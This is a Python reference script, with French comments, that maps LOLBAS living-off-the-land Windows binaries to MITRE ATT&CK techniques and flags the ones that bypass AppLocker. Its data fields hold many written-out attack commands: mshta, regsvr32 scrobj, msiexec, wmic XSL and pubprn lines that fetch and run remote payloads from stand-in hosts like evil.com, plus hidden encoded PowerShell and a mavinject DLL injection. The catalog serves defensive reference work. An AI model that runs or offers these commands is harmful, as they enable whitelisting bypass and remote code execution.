#!/usr/bin/env python3
"""
MITRE ATT&CK Technique Catalog - Techniques LOLBAS Documentées
Référence: https://attack.mitre.org/
"""

import json
import os

class MitreMapper:
    """Mapping des techniques LOLBAS vers MITRE ATT&CK"""
    
    def __init__(self):
        self.techniques = {
            # ═══════════════════════════════════════════════════════
            # EXECUTION (TA0002)
            # ═══════════════════════════════════════════════════════
            "T1059.001": {
                "name": "Command and Scripting Interpreter: PowerShell",
                "tactics": ["Execution"],
                "tools": ["powershell.exe", "pwsh.exe"],
                "applocker_bypass": True,
                "examples": [
                    "powershell.exe -nop -w hidden -c IEX(...)",
                    "powershell.exe -EncodedCommand <base64>"
                ]
            },
            "T1059.003": {
                "name": "Command and Scripting Interpreter: Windows Command Shell",
                "tactics": ["Execution"],
                "tools": ["cmd.exe"],
                "applocker_bypass": False,
                "examples": [
                    "cmd.exe /c <command>",
                    "cmd.exe /k <command>"
                ]
            },
            "T1059.005": {
                "name": "Command and Scripting Interpreter: Visual Basic",
                "tactics": ["Execution"],
                "tools": ["cscript.exe", "wscript.exe"],
                "applocker_bypass": True,
                "examples": [
                    "cscript.exe payload.vbs",
                    "wscript.exe //E:VBScript payload.txt"
                ]
            },
            "T1059.007": {
                "name": "Command and Scripting Interpreter: JavaScript",
                "tactics": ["Execution"],
                "tools": ["cscript.exe", "wscript.exe"],
                "applocker_bypass": True,
                "examples": [
                    "cscript.exe payload.js",
                    "wscript.exe //E:JScript payload.txt"
                ]
            },
            
            # ═══════════════════════════════════════════════════════
            # DEFENSE EVASION (TA0005)
            # ═══════════════════════════════════════════════════════
            "T1218.001": {
                "name": "System Binary Proxy Execution: Compiled HTML File",
                "tactics": ["Defense Evasion"],
                "tools": ["hh.exe"],
                "applocker_bypass": True,
                "examples": [
                    "hh.exe payload.chm",
                    "hh.exe http://evil.com/payload.chm"
                ]
            },
            "T1218.003": {
                "name": "System Binary Proxy Execution: CMSTP",
                "tactics": ["Defense Evasion"],
                "tools": ["cmstp.exe"],
                "applocker_bypass": True,
                "examples": [
                    "cmstp.exe /s payload.inf"
                ]
            },
            "T1218.004": {
                "name": "System Binary Proxy Execution: InstallUtil",
                "tactics": ["Defense Evasion"],
                "tools": ["InstallUtil.exe"],
                "applocker_bypass": True,
                "examples": [
                    "InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll"
                ]
            },
            "T1218.005": {
                "name": "System Binary Proxy Execution: Mshta",
                "tactics": ["Defense Evasion"],
                "tools": ["mshta.exe"],
                "applocker_bypass": True,
                "examples": [
                    "mshta.exe payload.hta",
                    "mshta.exe http://evil.com/payload.hta",
                    "mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run...\")"
                ]
            },
            "T1218.007": {
                "name": "System Binary Proxy Execution: Msiexec",
                "tactics": ["Defense Evasion"],
                "tools": ["msiexec.exe"],
                "applocker_bypass": True,
                "examples": [
                    "msiexec.exe /q /i http://evil.com/payload.msi"
                ]
            },
            "T1218.009": {
                "name": "System Binary Proxy Execution: Regsvcs/Regasm",
                "tactics": ["Defense Evasion"],
                "tools": ["regsvcs.exe", "regasm.exe"],
                "applocker_bypass": True,
                "examples": [
                    "regsvcs.exe payload.dll",
                    "regasm.exe payload.dll"
                ]
            },
            "T1218.010": {
                "name": "System Binary Proxy Execution: Regsvr32",
                "tactics": ["Defense Evasion"],
                "tools": ["regsvr32.exe"],
                "applocker_bypass": True,
                "examples": [
                    "regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll",
                    "regsvr32.exe /s payload.dll"
                ]
            },
            "T1218.011": {
                "name": "System Binary Proxy Execution: Rundll32",
                "tactics": ["Defense Evasion"],
                "tools": ["rundll32.exe"],
                "applocker_bypass": True,
                "examples": [
                    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";...",
                    "rundll32.exe payload.dll,EntryPoint"
                ]
            },
            "T1127.001": {
                "name": "Trusted Developer Utilities: MSBuild",
                "tactics": ["Defense Evasion"],
                "tools": ["MSBuild.exe"],
                "applocker_bypass": True,
                "examples": [
                    "MSBuild.exe payload.xml"
                ]
            },
            
            # ═══════════════════════════════════════════════════════
            # ADDITIONAL TECHNIQUES
            # ═══════════════════════════════════════════════════════
            "T1047": {
                "name": "Windows Management Instrumentation",
                "tactics": ["Execution"],
                "tools": ["wmic.exe"],
                "applocker_bypass": True,
                "examples": [
                    "wmic process call create \"powershell.exe\"",
                    "wmic os get /FORMAT:\"http://evil.com/payload.xsl\""
                ]
            },
            "T1216.001": {
                "name": "System Script Proxy Execution: PubPrn",
                "tactics": ["Defense Evasion"],
                "tools": ["pubprn.vbs"],
                "applocker_bypass": True,
                "examples": [
                    "pubprn.vbs 127.0.0.1 script:http://evil.com/payload.sct"
                ]
            },
            "T1055.001": {
                "name": "Process Injection: Dynamic-link Library Injection",
                "tactics": ["Defense Evasion", "Privilege Escalation"],
                "tools": ["mavinject.exe", "rundll32.exe"],
                "applocker_bypass": True,
                "examples": [
                    "mavinject.exe <PID> /INJECTRUNNING <PATH_TO_DLL>"
                ]
            }
        }
    
    def get_technique(self, tid):
        """Retourne les détails d'une technique"""
        return self.techniques.get(tid, None)
    
    def get_all_techniques(self):
        """Retourne toutes les techniques"""
        return self.techniques
    
    def get_by_tool(self, tool_name):
        """Trouve toutes les techniques utilisant un outil spécifique"""
        results = []
        for tid, data in self.techniques.items():
            if tool_name.lower() in [t.lower() for t in data['tools']]:
                results.append({
                    'id': tid,
                    'name': data['name'],
                    'examples': data['examples']
                })
        return results
    
    def get_applocker_bypasses(self):
        """Retourne uniquement les techniques qui peuvent bypass AppLocker"""
        return {tid: data for tid, data in self.techniques.items() 
                if data.get('applocker_bypass', False)}
    
    def export_json(self, filename="mitre_techniques.json"):
        """Export vers JSON"""
        with open(filename, "w") as f:
            json.dump(self.techniques, f, indent=2)
        print(f"[+] Techniques exportées vers {filename}")
    
    def generate_markdown_report(self, filename="MITRE_TECHNIQUES.md"):
        """Génère un rapport Markdown"""
        report = "# 🎯 MITRE ATT&CK - Techniques LOLBAS\n\n"
        report += "## Catalogue des Techniques de Bypass AppLocker\n\n"
        
        bypasses = self.get_applocker_bypasses()
        
        for tid, data in bypasses.items():
            report += f"### {tid}: {data['name']}\n\n"
            report += f"**Tactiques**: {', '.join(data['tactics'])}\n\n"
            report += f"**Outils**: `{'`, `'.join(data['tools'])}`\n\n"
            report += "**Exemples d'utilisation**:\n\n"
            for example in data['examples']:
                report += f"```bash\n{example}\n```\n\n"
            report += "---\n\n"
        
        with open(filename, "w", encoding="utf-8") as f:
            f.write(report)
        print(f"[+] Rapport Markdown généré: {filename}")


# ═══════════════════════════════════════════════════════
# LOLBAS PROJECT - CATALOGUE COMPLET
# ═══════════════════════════════════════════════════════

LOLBAS_CATALOG = {
    "mshta.exe": {
        "category": "Execute",
        "paths": [
            "C:\\Windows\\System32\\mshta.exe",
            "C:\\Windows\\SysWOW64\\mshta.exe"
        ],
        "commands": [
            "mshta.exe http://webserver/payload.hta",
            "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:http://webserver/payload.sct\"\")\"))",
            "mshta.exe javascript:a=GetObject(\"script:http://webserver/payload.sct\").Exec();close();"
        ],
        "mitre": ["T1218.005"]
    },
    "regsvr32.exe": {
        "category": "Execute",
        "paths": [
            "C:\\Windows\\System32\\regsvr32.exe",
            "C:\\Windows\\SysWOW64\\regsvr32.exe"
        ],
        "commands": [
            "regsvr32.exe /s /u /i:http://webserver/payload.sct scrobj.dll",
            "regsvr32.exe /s /n /u /i:http://webserver/payload.sct scrobj.dll"
        ],
        "mitre": ["T1218.010"]
    },
    "rundll32.exe": {
        "category": "Execute",
        "paths": [
            "C:\\Windows\\System32\\rundll32.exe",
            "C:\\Windows\\SysWOW64\\rundll32.exe"
        ],
        "commands": [
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://webserver/payload.sct\")",
            "rundll32.exe url.dll,OpenURL http://webserver/payload.hta",
            "rundll32.exe shell32.dll,Control_RunDLL payload.cpl"
        ],
        "mitre": ["T1218.011"]
    },
    "MSBuild.exe": {
        "category": "Execute",
        "paths": [
            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe",
            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
        ],
        "commands": [
            "MSBuild.exe payload.xml"
        ],
        "mitre": ["T1127.001"]
    },
    "InstallUtil.exe": {
        "category": "Execute",
        "paths": [
            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe",
            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"
        ],
        "commands": [
            "InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll"
        ],
        "mitre": ["T1218.004"]
    },
    "wmic.exe": {
        "category": "Execute",
        "paths": [
            "C:\\Windows\\System32\\wbem\\wmic.exe",
            "C:\\Windows\\SysWOW64\\wbem\\wmic.exe"
        ],
        "commands": [
            "wmic process call create \"powershell.exe -nop -w hidden -c IEX...\"",
            "wmic os get /FORMAT:\"http://webserver/payload.xsl\""
        ],
        "mitre": ["T1047"]
    },
    "cscript.exe": {
        "category": "Execute",
        "paths": [
            "C:\\Windows\\System32\\cscript.exe",
            "C:\\Windows\\SysWOW64\\cscript.exe"
        ],
        "commands": [
            "cscript.exe payload.vbs",
            "cscript.exe //E:VBScript payload.txt"
        ],
        "mitre": ["T1059.005"]
    },
    "pubprn.vbs": {
        "category": "Execute",
        "paths": [
            "C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs"
        ],
        "commands": [
            "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script:http://webserver/payload.sct"
        ],
        "mitre": ["T1216.001"]
    }
}


# ═══════════════════════════════════════════════════════
# EXEMPLE D'UTILISATION
# ═══════════════════════════════════════════════════════

if __name__ == "__main__":
    mapper = MitreMapper()
    
    print("\n🎯 MITRE ATT&CK - Mapping LOLBAS\n")
    print("=" * 60)
    
    # Afficher toutes les techniques de bypass AppLocker
    bypasses = mapper.get_applocker_bypasses()
    print(f"\n✅ {len(bypasses)} techniques de bypass AppLocker identifiées\n")
    
    for tid, data in list(bypasses.items())[:5]:
        print(f"📌 {tid}: {data['name']}")
        print(f"   Outils: {', '.join(data['tools'])}")
        print()
    
    # Rechercher par outil
    print("\n🔍 Recherche: techniques utilisant 'mshta.exe'")
    results = mapper.get_by_tool("mshta.exe")
    for r in results:
        print(f"   → {r['id']}: {r['name']}")
    
    # Export
    mapper.export_json("mitre_techniques.json")
    mapper.generate_markdown_report("MITRE_TECHNIQUES.md")
    
    print("\n📋 LOLBAS CATALOG - Outils Disponibles:")
    for tool, data in LOLBAS_CATALOG.items():
        print(f"   • {tool:<20} → MITRE: {', '.join(data['mitre'])}")
    
    print("\n⚠️  Référence: https://lolbas-project.github.io/")
    print("⚠️  Usage strictement éducatif et défensif uniquement")